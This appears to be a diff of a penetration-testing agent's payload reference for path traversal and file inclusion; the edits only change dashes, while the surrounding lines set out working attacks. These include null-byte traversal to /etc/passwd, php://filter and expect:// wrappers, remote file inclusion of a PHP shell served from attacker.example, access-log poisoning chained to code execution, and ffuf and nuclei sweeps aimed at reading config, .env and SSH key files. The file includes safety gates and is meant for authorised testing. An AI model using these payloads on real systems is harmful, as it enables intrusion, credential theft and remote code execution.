@@ -1,4 +1,4 @@
-# payloads — path-traversal-hunter
+# payloads - path-traversal-hunter
 
 **Source:** `pentest-agent-development/notebooklm-notes/Guia Técnico_ Vulnerabilidades de Inclusão de Arquivos e Traversal.md` (Section 5: PAYLOADS / PROBES)
 
@@ -8,7 +8,7 @@ shells without `destructive_testing: approved`.
 
 ---
 
-## 1. Baseline — Known-Good Reference
+## 1. Baseline - Known-Good Reference
 
 Before traversal, confirm the endpoint reads the file you supply.
 Request a legitimate file and capture the response length:
@@ -88,7 +88,7 @@ When the app appends an extension (`.jpg`, `.pdf`), terminate early:
 ../../../../etc/passwd\x00.jpg
 ```
 
-Modern PHP (>= 5.3.4) prevents this — still try on legacy apps.
+Modern PHP (>= 5.3.4) prevents this - still try on legacy apps.
 
 ## 7. Recursive / Filter-Bypass Variants
 
@@ -110,7 +110,7 @@ php://filter/convert.base64-encode/resource=/etc/passwd
 php://filter/convert.base64-encode/resource=../config.php
 php://filter/read=convert.iconv.UTF-8.UTF-16/resource=/etc/passwd
 php://input                                      # read POST body
-expect://id                                      # GATED — executes command
+expect://id                                      # GATED - executes command
 data://text/plain;base64,ZGVidWc=
 ```
 
@@ -142,7 +142,7 @@ After access to any file is confirmed, target application source:
 ../../../../WEB-INF/classes/application.yml
 ```
 
-Source files often contain hardcoded credentials — see also
+Source files often contain hardcoded credentials - see also
 `secrets-in-code-hunter`.
 
 ---
@@ -168,29 +168,29 @@ Host a text file at `attacker.example/shell.txt` containing:
 <?php echo shell_exec("id"); ?>
 ```
 
-RFI with command execution is DESTRUCTIVE — gate behind
+RFI with command execution is DESTRUCTIVE - gate behind
 `destructive_testing: approved` and use a harmless probe first
 (`<?php phpinfo(); ?>`).
 
 ---
 
-## 12. Local File Inclusion (LFI) — Chaining for RCE
+## 12. Local File Inclusion (LFI) - Chaining for RCE
 
-Not a direct payload — a sequence. When LFI + write-able path exists:
+Not a direct payload - a sequence. When LFI + write-able path exists:
 
 1. Write attacker-controlled content to a log file the PHP app will
    `include()`. E.g., poison `access.log` by making a request with a
    `User-Agent` that is PHP code.
 2. Use LFI to include that log.
 
-This is destructive — gate behind approval.
+This is destructive - gate behind approval.
 
 ---
 
 ## Sweep Commands
 
 ```bash
-# ffuf — fuzz a file parameter
+# ffuf - fuzz a file parameter
 ffuf -w lfi_payloads.txt:PAYLOAD \
      -u "https://target/view?file=PAYLOAD" \
      -mc 200,500 -fs 0
@@ -218,16 +218,16 @@ nuclei -u "https://target/view?file=FUZZ" \
 | `java -jar` / `MANIFEST.MF`                        | Jar / WAR internals disclosed  |
 | `AWS_ACCESS_KEY_ID=` / `DATABASE_URL=`             | `.env` or config disclosed     |
 | `...` identical to a legit-file response           | Traversal blocked / normalized |
-| HTTP 400 "invalid path"                            | Filter active — try evasion    |
+| HTTP 400 "invalid path"                            | Filter active - try evasion    |
 
 ---
 
 ## Safety Notes
 
-- Reading `/root/.ssh/id_rsa` from a system is exfiltration — confirm
+- Reading `/root/.ssh/id_rsa` from a system is exfiltration - confirm
   one readable sensitive file, record the finding, and stop. Do NOT
   read hundreds of files.
-- Some apps write audit log entries for every file-read — expect
+- Some apps write audit log entries for every file-read - expect
   detection during RFI probes.
 - The `data://` and `expect://` wrappers execute code on the target.
   Gate `expect://id` behind `destructive_testing: approved`.
